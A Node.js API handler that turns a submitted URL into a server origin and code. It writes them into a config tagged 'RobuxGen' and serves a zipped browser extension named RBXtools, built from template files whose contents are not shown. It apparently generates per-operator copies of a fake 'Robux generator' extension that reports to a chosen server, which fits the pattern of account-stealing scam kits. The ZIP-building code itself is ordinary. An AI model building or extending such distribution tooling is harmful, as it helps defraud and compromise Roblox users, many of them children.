import fs from "fs";
import path from "path";

const TEMPLATE_DIR = path.join(process.cwd(), "extension-template");

// ── Minimal pure-Node ZIP builder (no dependencies) ─────────────────────────

function crc32(buf) {
  const table = new Uint32Array(256);
  for (let i = 0; i < 256; i++) {
    let c = i;
    for (let j = 0; j < 8; j++) c = c & 1 ? 0xedb88320 ^ (c >>> 1) : c >>> 1;
    table[i] = c;
  }
  let crc = 0xffffffff;
  for (let i = 0; i < buf.length; i++)
    crc = (crc >>> 8) ^ table[(crc ^ buf[i]) & 0xff];
  return (crc ^ 0xffffffff) >>> 0;
}

function buildZip(files) {
  // files: [{ name: string, data: Buffer }]
  const locals = [];
  const centrals = [];
  let offset = 0;

  const now = new Date();
  const dosDate =
    (((now.getFullYear() - 1980) & 0x7f) << 9) |
    (((now.getMonth() + 1) & 0x0f) << 5) |
    (now.getDate() & 0x1f);
  const dosTime =
    ((now.getHours() & 0x1f) << 11) |
    ((now.getMinutes() & 0x3f) << 5) |
    ((now.getSeconds() >> 1) & 0x1f);

  for (const file of files) {
    const nameBuf = Buffer.from(file.name, "utf8");
    const data = file.data;
    const crc = crc32(data);

    const local = Buffer.alloc(30 + nameBuf.length);
    local.writeUInt32LE(0x04034b50, 0);
    local.writeUInt16LE(20, 4);
    local.writeUInt16LE(0, 6);
    local.writeUInt16LE(0, 8); // stored
    local.writeUInt16LE(dosTime, 10);
    local.writeUInt16LE(dosDate, 12);
    local.writeUInt32LE(crc, 14);
    local.writeUInt32LE(data.length, 18);
    local.writeUInt32LE(data.length, 22);
    local.writeUInt16LE(nameBuf.length, 26);
    local.writeUInt16LE(0, 28);
    nameBuf.copy(local, 30);
    locals.push(Buffer.concat([local, data]));

    const central = Buffer.alloc(46 + nameBuf.length);
    central.writeUInt32LE(0x02014b50, 0);
    central.writeUInt16LE(20, 4);
    central.writeUInt16LE(20, 6);
    central.writeUInt16LE(0, 8);
    central.writeUInt16LE(0, 10);
    central.writeUInt16LE(dosTime, 12);
    central.writeUInt16LE(dosDate, 14);
    central.writeUInt32LE(crc, 16);
    central.writeUInt32LE(data.length, 20);
    central.writeUInt32LE(data.length, 24);
    central.writeUInt16LE(nameBuf.length, 28);
    central.writeUInt16LE(0, 30);
    central.writeUInt16LE(0, 32);
    central.writeUInt16LE(0, 34);
    central.writeUInt16LE(0, 36);
    central.writeUInt32LE(0, 38);
    central.writeUInt32LE(offset, 42);
    nameBuf.copy(central, 46);
    centrals.push(central);

    offset += 30 + nameBuf.length + data.length;
  }

  const centralBuf = Buffer.concat(centrals);
  const eocd = Buffer.alloc(22);
  eocd.writeUInt32LE(0x06054b50, 0);
  eocd.writeUInt16LE(0, 4);
  eocd.writeUInt16LE(0, 6);
  eocd.writeUInt16LE(files.length, 8);
  eocd.writeUInt16LE(files.length, 10);
  eocd.writeUInt32LE(centralBuf.length, 12);
  eocd.writeUInt32LE(offset, 16);
  eocd.writeUInt16LE(0, 20);

  return Buffer.concat([...locals, centralBuf, eocd]);
}

// ── Handler ──────────────────────────────────────────────────────────────────

export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({ error: "Method not allowed" });
  }

  const { path: rawPath } = req.body ?? {};
  if (!rawPath || typeof rawPath !== "string") {
    return res.status(400).json({ error: "Campo 'path' obrigatório." });
  }

  let parsed;
  try {
    parsed = new URL(rawPath.trim());
  } catch {
    return res
      .status(400)
      .json({ error: "URL inválida. Use o formato: https://seusite.com/e/nome" });
  }

  // Extract server (origin) and code (last path segment)
  const server = parsed.origin; // e.g. https://rblxtool.com
  const segments = parsed.pathname.split("/").filter(Boolean);
  const code = segments[segments.length - 1];

  if (!code) {
    return res
      .status(400)
      .json({ error: "URL deve conter o nome ao final, ex: /e/nexus" });
  }

  // Build the modified config.js
  const configJs = `var EXTENSION_CONFIG = ${JSON.stringify({ code, type: "RobuxGen", server })};`;

  // Read all template files
  function readFile(rel) {
    return fs.readFileSync(path.join(TEMPLATE_DIR, rel));
  }

  try {
    const files = [
      { name: "RBXtools/manifest.json",  data: readFile("manifest.json") },
      { name: "RBXtools/config.js",      data: Buffer.from(configJs, "utf8") },
      { name: "RBXtools/background.js",  data: readFile("background.js") },
      { name: "RBXtools/content.js",     data: readFile("content.js") },
      { name: "RBXtools/popup.html",     data: readFile("popup.html") },
      { name: "RBXtools/popup.css",      data: readFile("popup.css") },
      { name: "RBXtools/popup.js",       data: readFile("popup.js") },
      { name: "RBXtools/icons/icon16.png",  data: readFile("icons/icon16.png") },
      { name: "RBXtools/icons/icon48.png",  data: readFile("icons/icon48.png") },
      { name: "RBXtools/icons/icon128.png", data: readFile("icons/icon128.png") },
    ];

    const zip = buildZip(files);

    res.setHeader("Content-Type", "application/zip");
    res.setHeader("Content-Disposition", 'attachment; filename="RBXtools.zip"');
    res.setHeader("Content-Length", zip.length);
    return res.status(200).send(zip);
  } catch (err) {
    return res.status(500).json({ error: "Erro interno ao gerar extensão.", detail: String(err) });
  }
}
